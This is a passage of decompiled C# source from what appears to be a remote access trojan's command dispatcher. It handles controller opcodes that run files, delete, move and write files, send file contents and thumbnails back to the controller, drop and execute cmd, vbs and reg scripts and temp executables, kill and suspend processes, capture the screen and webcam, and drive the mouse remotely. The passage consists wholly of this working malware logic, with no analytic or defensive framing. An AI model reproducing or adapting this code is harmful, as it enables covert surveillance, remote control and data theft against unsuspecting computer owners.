							if (Operators.CompareString(text26.ToLower(), Strings.Split(text25, ".", -1, (CompareMethod)0)[Strings.Split(text25, ".", -1, (CompareMethod)0).Length - 1].ToLower(), false) == 0)
							{
								flag = true;
								break;
							}
						}
						if (unchecked(flag && num32 < 20))
						{
							try
							{
								Image val6 = Image.FromFile(text25);
								MemoryStream memoryStream15 = new MemoryStream();
								EncoderParameters val7 = new EncoderParameters(1);
								val7.get_Param()[0] = new EncoderParameter(Encoder.Quality, 40L);
								ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
								Image thumbnailImage = val6.GetThumbnailImage(20, 20, (GetThumbnailImageAbort)null, IntPtr.Zero);
								thumbnailImage.Save((Stream)memoryStream15, encoderInfo, val7);
								string text27 = text22;
								string y4 = Y;
								string[] array12 = new string[5];
								string[] array48 = array12;
								array14 = new object[1];
								object[] array49 = array14;
								num5 = 1;
								array49[0] = 1;
								lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
								string text28 = API.DEB(ref lpstrCommand);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
								array48[0] = Strings.Replace(text25, text28, "", 1, -1, (CompareMethod)0);
								array12[1] = "*";
								array12[2] = Conversions.ToString(FileSystem.FileLen(text25));
								array12[3] = "*";
								array12[4] = API.FEN(memoryStream15.ToArray());
								string lpstrReturnString = string.Concat(array12);
								text22 = text27 + y4 + API.ENB(ref lpstrReturnString);
								memoryStream15.Dispose();
								val7.Dispose();
								val6.Dispose();
								num32++;
							}
							catch (Exception ex17)
							{
								ProjectData.SetProjectError(ex17, num2);
								string text29 = text22;
								string y5 = Y;
								array14 = new object[1];
								object[] array50 = array14;
								num5 = 1;
								array50[0] = 1;
								lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
								string text30 = API.DEB(ref lpstrCommand);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
								string lpstrReturnString = Strings.Replace(text25, text30, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text25));
								text22 = text29 + y5 + API.ENB(ref lpstrReturnString);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							string text31 = text22;
							string y6 = Y;
							array14 = new object[1];
							object[] array51 = array14;
							num5 = 1;
							array51[0] = 1;
							lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
							string text32 = API.DEB(ref lpstrCommand);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
							string lpstrReturnString = Strings.Replace(text25, text32, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text25));
							text22 = text31 + y6 + API.ENB(ref lpstrReturnString);
						}
					}
					B b19 = MyProject.Forms.B;
					lpstrCommand = "#9" + text22;
					b19.SEND(ref lpstrCommand);
					text22 = "";
					break;
				}
				case "#11":
				{
					num = 1;
					int num25 = array.Length - 1;
					for (int num26 = 1; num26 <= num25; num26++)
					{
						try
						{
							string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num26 }, (string[])null));
							string fileName = API.DEB(ref lpstrCommand);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num26, lpstrCommand }, (string[])null, true, false);
							Process.Start(fileName);
						}
						catch (Exception ex16)
						{
							ProjectData.SetProjectError(ex16, num2);
							ProjectData.ClearProjectError();
						}
					}
					break;
				}
				case "#12":
				{
					num = 1;
					object[] array14 = new object[1];
					object[] array31 = array14;
					int num5 = 1;
					array31[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string text11 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					Array array32 = Strings.Split(text11, "\r\n", -1, (CompareMethod)0);
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array32, new object[1] { 3 }, (string[])null), (object)"DIR", false))
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array32, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array32, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array32, new object[1] { 2 }, (string[])null)));
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array32, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array32, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array32, new object[1] { 2 }, (string[])null)));
					}
					break;
				}
				case "#13":
				{
					num = 1;
					int num20 = array.Length - 1;
					for (int num21 = 1; num21 <= num20; num21++)
					{
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num21 }, (string[])null));
						string path8 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num21, lpstrCommand }, (string[])null, true, false);
						if (Directory.Exists(path8))
						{
							try
							{
								string lpstrReturnString = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num21 }, (string[])null));
								string path9 = API.DEB(ref lpstrReturnString);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num21, lpstrReturnString }, (string[])null, true, false);
								Directory.Delete(path9, recursive: true);
							}
							catch (Exception ex12)
							{
								ProjectData.SetProjectError(ex12, num2);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							try
							{
								lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num21 }, (string[])null));
								string path10 = API.DEB(ref lpstrCommand);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num21, lpstrCommand }, (string[])null, true, false);
								File.Delete(path10);
							}
							catch (Exception ex13)
							{
								ProjectData.SetProjectError(ex13, num2);
								ProjectData.ClearProjectError();
							}
						}
					}
					break;
				}
				case "#14":
				{
					num = 1;
					object[] array14 = new object[1];
					object[] array27 = array14;
					int num5 = 1;
					array27[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string text9 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					FileSystem.MkDir(text9);
					break;
				}
				case "#15":
				{
					num = 1;
					int num16 = array.Length - 1;
					for (int num17 = 1; num17 <= num16; num17++)
					{
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num17 }, (string[])null));
						string text8 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num17, lpstrCommand }, (string[])null, true, false);
						Array array26 = Strings.Split(text8, "\r\n", -1, (CompareMethod)0);
						if (Directory.Exists(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array26, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array26, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0)))
						{
							Directory.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array26, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array26, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array26, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array26, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
						else
						{
							File.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array26, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array26, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array26, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array26, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
					}
					break;
				}
				case "#16":
				{
					num = 1;
					B b10 = MyProject.Forms.B;
					string text7 = "#11" + Y;
					object[] array24 = new object[1];
					object[] array25 = array24;
					int num5 = 1;
					array25[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array24, (string[])null));
					string path7 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					string lpstrReturnString = File.ReadAllText(path7);
					string N = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text7 + API.ENB(ref lpstrReturnString), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
					b10.SEND(ref N);
					break;
				}
				case "#17":
				{
					num = 1;
					object[] array6 = new object[1];
					object[] array22 = array6;
					int num5 = 1;
					array22[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string path6 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					object[] array14 = new object[1];
					object[] array23 = array14;
					int num4 = 2;
					array23[0] = 2;
					string lpstrReturnString = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string contents = API.DEB(ref lpstrReturnString);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, lpstrReturnString }, (string[])null, true, false);
					File.WriteAllText(path6, contents);
					break;
				}
				case "#18":
				{
					num = 1;
					object[] array6 = new object[1];
					object[] array18 = array6;
					int num5 = 1;
					array18[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string path5 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					File.Create(path5);
					break;
				}
				case "#19":
				{
					num = 1;
					MemoryStream memoryStream8 = new MemoryStream();
					int num8 = Strings.InStr(@string, Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (CompareMethod)0) + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length + Y.Length - 1;
					int num9 = Da.Length - 1;
					for (int m = num8; m <= num9; m++)
					{
						memoryStream8.WriteByte(Da[m]);
					}
					object[] array6 = new object[1];
					object[] array17 = array6;
					int num5 = 1;
					array17[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string path3 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					byte[] b7 = memoryStream8.ToArray();
					bool CM = false;
					File.WriteAllBytes(path3, API.ZIP(b7, ref CM));
					break;
				}
				case "#20":
				{
					num = 1;
					object[] array6 = new object[1];
					object[] array7 = array6;
					int num5 = 1;
					array7[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string text3 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					Array array8 = Strings.Split(text3, "\\", -1, (CompareMethod)0);
					MemoryStream memoryStream5 = new MemoryStream();
					byte[] array9 = (byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#12" + Y), NewLateBinding.LateIndexGet((object)array8, new object[1] { array8.Length - 1 }, (string[])null)), (object)Y) }, (string[])null, (Type[])null, (bool[])null);
					memoryStream5.Write(array9, 0, array9.Length);
					array6 = new object[1];
					object[] array10 = array6;
					num5 = 1;
					array10[0] = 1;
					lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string path = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					byte[] b5 = File.ReadAllBytes(path);
					bool CM = true;
					array9 = API.ZIP(b5, ref CM);
					memoryStream5.Write(array9, 0, array9.Length);
					array9 = null;
					MyProject.Forms.B.WC.SendData(memoryStream5.ToArray());
					memoryStream5.Dispose();
					break;
				}
				case "#21":
				{
					num = 1;
					int num6 = array.Length - 1;
					for (int l = 1; l <= num6; l++)
					{
						Thread.Sleep(10);
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
						string text4 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, lpstrCommand }, (string[])null, true, false);
						Image val3 = (Image)new Bitmap(text4);
						val3.Dispose();
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
						string text5 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, lpstrCommand }, (string[])null, true, false);
						Array array11 = Strings.Split(text5, "\\", -1, (CompareMethod)0);
						B b6 = MyProject.Forms.B;
						string[] array12 = new string[5] { "#13", Y, null, null, null };
						string[] array13 = array12;
						object[] array14 = new object[1];
						object[] array15 = array14;
						int num5 = array11.Length - 1;
						array15[0] = num5;
						string lpstrReturnString = Conversions.ToString(NewLateBinding.LateIndexGet((object)array11, array14, (string[])null));
						string text6 = API.ENB(ref lpstrReturnString);
						NewLateBinding.LateIndexSetComplex((object)array11, new object[2] { num5, lpstrReturnString }, (string[])null, true, false);
						array13[2] = text6;
						array12[3] = Y;
						string[] array16 = array12;
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { l }, (string[])null));
						string path2 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { l, lpstrCommand }, (string[])null, true, false);
						array16[4] = API.FEN(File.ReadAllBytes(path2));
						string N = string.Concat(array12);
						b6.SEND(ref N);
					}
					break;
				}
				case "#22":
				{
					num = 1;
					Process[] processes = Process.GetProcesses();
					string text = default(string);
					foreach (Process process in processes)
					{
						try
						{
							text = text + Y + process.MainModule!.ModuleName + "*" + Conversions.ToString(process.Id);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex, num2);
							text = text + Y + process.ProcessName + "*" + Conversions.ToString(process.Id);
							ProjectData.ClearProjectError();
						}
					}
					B b2 = MyProject.Forms.B;
					string lpstrCommand = "#14" + text;
					b2.SEND(ref lpstrCommand);
					text = "";
					break;
				}
				case "#23":
				{
					num = 1;
					int num40 = array.Length - 1;
					for (int num41 = 1; num41 <= num40; num41++)
					{
						Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num41 }, (string[])null))).Kill();
					}
					break;
				}
				case "#24":
				{
					try
					{
						chat.clos = true;
					}
					catch (Exception ex20)
					{
						ProjectData.SetProjectError(ex20, num2);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(100);
					object[] array6 = new object[1];
					object[] array74 = array6;
					int num5 = 1;
					array74[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					string cht = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					B.Cht = cht;
					break;
				}
				case "#25":
					num = 0;
					if (((Control)B.Chat).get_InvokeRequired())
					{
						indd indd = inddd;
						object[] array6 = new object[1];
						object[] array68 = array6;
						int num5 = 1;
						array68[0] = 1;
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string text40 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
						string text41 = text40;
						((Control)B.Chat).Invoke((Delegate)indd, new object[1] { text41 });
					}
					else
					{
						RichTextBox t = B.Chat.T1;
						string[] array12 = new string[5]
						{
							t.get_Text(),
							MyProject.Forms.chat.nick,
							" : ",
							null,
							null
						};
						string[] array69 = array12;
						object[] array6 = new object[1];
						object[] array70 = array6;
						int num5 = 1;
						array70[0] = 1;
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string text42 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
						array69[3] = text42;
						array12[4] = "\r\n";
						t.set_Text(string.Concat(array12));
					}
					break;
				case "#26":
					num = 0;
					chat.clos = true;
					break;
				case "#27":
				{
					num = 1;
					int num38 = 0;
					string s3 = default(string);
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num38), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								FileSystem.Kill(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num38), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								s3 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num38), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
							}
							catch (Exception ex19)
							{
								ProjectData.SetProjectError(ex19, num2);
								ProjectData.ClearProjectError();
								goto IL_2ef5;
							}
						}
						else
						{
							s3 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num38), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						}
						break;
						IL_2ef5:
						num38++;
					}
					while (num38 <= 9999);
					string lpstrCommand;
					switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.ToLower())
					{
					case "cmd":
					{
						string path17 = s3;
						object[] array24 = new object[1];
						object[] array61 = array24;
						int num5 = 2;
						array61[0] = 2;
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array24, (string[])null));
						string contents5 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, lpstrCommand }, (string[])null, true, false);
						File.WriteAllText(path17, contents5);
						Interaction.Shell(s3, (AppWinStyle)0, false, -1);
						break;
					}
					case "vbs":
					{
						string path16 = s3;
						object[] array6 = new object[1];
						object[] array60 = array6;
						int num5 = 2;
						array60[0] = 2;
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string contents4 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, lpstrCommand }, (string[])null, true, false);
						File.WriteAllText(path16, contents4);
						Process.Start(s3);
						break;
					}
					case "Reg":
					{
						string path15 = s3;
						object[] array6 = new object[1];
						object[] array59 = array6;
						int num5 = 2;
						array59[0] = 2;
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string contents3 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, lpstrCommand }, (string[])null, true, false);
						File.WriteAllText(path15, contents3);
						Interaction.Shell(s3, (AppWinStyle)2, false, -1);
						break;
					}
					default:
					{
						string path14 = s3;
						object[] array6 = new object[1];
						object[] array58 = array6;
						int num5 = 2;
						array58[0] = 2;
						lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string contents2 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, lpstrCommand }, (string[])null, true, false);
						File.WriteAllText(path14, contents2);
						Process.Start(s3);
						break;
					}
					}
					B b20 = MyProject.Forms.B;
					lpstrCommand = "#10" + Y + "^" + Conversions.ToString(4) + Y + API.ENB(ref s3);
					b20.SEND(ref lpstrCommand);
					break;
				}
				case "#28":
				{
					num = 1;
					object obj2 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj2, (object)"!", false))
					{
						B b16 = MyProject.Forms.B;
						string y2 = Y;
						string lpstrCommand = "plugin.C";
						string lpstrReturnString = "W";
						object P = new object[0];
						string N = Conversions.ToString(C.inv(ref C.Plug, ref lpstrCommand, ref lpstrReturnString, ref P));
						string V = "#17" + y2 + API.ENB(ref N);
						b16.SEND(ref V);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"@", false))
					{
						int num24 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
						string lpstrReturnString = "plugin.C";
						string N = "CW";
						object[] array14 = new object[2] { num24, null };
						object[] array33 = array14;
						object[] array6 = new object[1];
						object[] array34 = array6;
						int num5 = 3;
						array34[0] = 3;
						string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						string text14 = API.DEB(ref lpstrCommand);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, lpstrCommand }, (string[])null, true, false);
						array33[1] = text14;
						object P = array14;
						C.inv(ref C.Plug, ref lpstrReturnString, ref N, ref P);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"#", false))
					{
						object[] array6 = new object[1];
						object[] array35 = array6;
						int num5 = 2;
						array35[0] = 2;
						int num4 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						object[] array14 = new object[1];
						object[] array36 = array14;
						int q = 3;
						array36[0] = 3;
						int num15 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
						API.wd.G(ref num4, ref num15);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, num15 }, (string[])null, true, false);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, num4 }, (string[])null, true, false);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"$", false))
					{
						MemoryStream memoryStream13 = new MemoryStream();
						object[] array6 = new object[1];
						object[] array37 = array6;
						int num15 = 2;
						array37[0] = 2;
						int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						Image obj3 = C.Capture(ref q);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, q }, (string[])null, true, false);
						obj3.Save((Stream)memoryStream13, ImageFormat.get_Jpeg());
						MemoryStream memoryStream14 = new MemoryStream();
						memoryStream14.Write(MyProject.Forms.B.WC.STB("#18" + Y), 0, MyProject.Forms.B.WC.STB("#18" + Y).Length);
						memoryStream14.Write(memoryStream13.ToArray(), 0, memoryStream13.ToArray().Length);
						MyProject.Forms.B.WC.SendData(memoryStream14.ToArray());
						memoryStream13.Dispose();
						memoryStream14.Dispose();
						MyProject.Forms.B = null;
					}
					break;
				}
				case "#29":
				{
					num = 0;
					B b13 = MyProject.Forms.B;
					string lpstrCommand = "#Bla";
					b13.SEND(ref lpstrCommand);
					int num22 = 0;
					string text10 = default(string);
					do
					{
						if (File.Exists(Interaction.Environ("temp") + "\\" + Conversions.ToString(num22) + ".exe"))
						{
							try
							{
								File.Delete(Interaction.Environ("temp") + "\\" + Conversions.ToString(num22) + ".exe");
								text10 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num22) + ".exe";
							}
							catch (Exception ex15)
							{
								ProjectData.SetProjectError(ex15, num2);
								ProjectData.ClearProjectError();
								goto IL_3598;
							}
						}
						else
						{
							text10 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num22) + ".exe";
						}
						break;
						IL_3598:
						num22++;
					}
					while (num22 <= 999);
					string path11 = text10;
					byte[] b14 = API.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					bool CM = false;
					File.WriteAllBytes(path11, API.ZIP(b14, ref CM));
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.FileName = text10;
					processStartInfo2.Arguments = "!0@" + Application.get_ExecutablePath() + "@" + B.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id);
					Process.Start(processStartInfo2);
					break;
				}
				case "#30":
					try
					{
						object[] array6 = new object[1];
						object[] array28 = array6;
						int num15 = 1;
						array28[0] = 1;
						int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
						byte[] array29 = sc.gc(ref q);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
						byte[] array30 = array29;
						MemoryStream memoryStream12 = new MemoryStream();
						memoryStream12.Write(Encoding.Default.GetBytes("#19" + Y), 0, Encoding.Default.GetBytes("#19" + Y).Length);
						memoryStream12.Write(array30, 0, array30.Length);
						MyProject.Forms.B.WC.SendData(memoryStream12.ToArray());
						break;
					}
					catch (Exception ex14)
					{
						ProjectData.SetProjectError(ex14, num2);
						ProjectData.ClearProjectError();
						break;
					}
				case "#31":
					num = 0;
					if (!B.Busy)
					{
						B.Busy = true;
						B b12 = MyProject.Forms.B;
						string lpstrCommand = "#16" + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width) + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
						b12.SEND(ref lpstrCommand);
						B.Busy = false;
					}
					break;
				case "#32":
				{
					num = 0;
					Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					Cursor.set_Position(position);
					object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj, (object)0, false))
					{
						mouse_event(8, 0, 0, 0, 1);
						mouse_event(16, 0, 0, 0, 1);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
					{
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)2, false))
					{
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
						mouse_event(2, 0, 0, 0, 1);
						mouse_event(4, 0, 0, 0, 1);
					}
					break;
				}
				case "#33":
				{
					B b9 = MyProject.Forms.B;
					string lpstrCommand = "#5" + Y + API.Gt();
					b9.SEND(ref lpstrCommand);
					break;
				}
				case "#34":
				{
					num = 0;
					object[] array6 = new object[1];
					object[] array19 = array6;
					int num15 = 1;
					array19[0] = 1;
					int q = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array6, (string[])null));
					byte[] array20 = C.Capture1(ref q);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, q }, (string[])null, true, false);
					byte[] array21 = array20;
					if (array21.Length != 0)
					{
						MemoryStream memoryStream10 = new MemoryStream();
						memoryStream10.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream10.Write(array21, 0, array21.Length);
						MyProject.Forms.B.WC.SendData(memoryStream10.ToArray());
					}
					break;
				}
				case "#35":
				{
					int num13 = array.Length - 1;
					for (int num14 = 1; num14 <= num13; num14++)
					{
						NTSuspendProcess.SuspendProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num14 }, (string[])null)));
					}
					break;
				}
				case "#36":
				{
					int num10 = array.Length - 1;
					for (int n = 1; n <= num10; n++)
					{
						NTSuspendProcess.ResumeProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { n }, (string[])null)));
					}
					break;
				}
				case "#37":
				{
					byte[] cam = Resources.Cam;
					bool CM = false;
					MemoryStream memoryStream9 = new MemoryStream(API.ZIP(cam, ref CM));
					byte[] F = memoryStream9.ToArray();
					string lpstrCommand = "Cam.Cam";
					string lpstrReturnString = "Dnames";
					object P = null;
					string s = Conversions.ToString(C.inv(ref F, ref lpstrCommand, ref lpstrReturnString, ref P));
					B b8 = MyProject.Forms.B;
					lpstrCommand = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat("#22" + Y, API.ENB(ref s)), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					b8.SEND(ref lpstrCommand);
					break;
				}
				case "#38":
				{
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null), (object)1, false))
					{
						num = -2;
					}
					int num7 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					string lpstrCommand = "Cam.Cam";
					string lpstrReturnString = "Cam";
					object P = new object[2]
					{
						num7,
						RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null))
					};
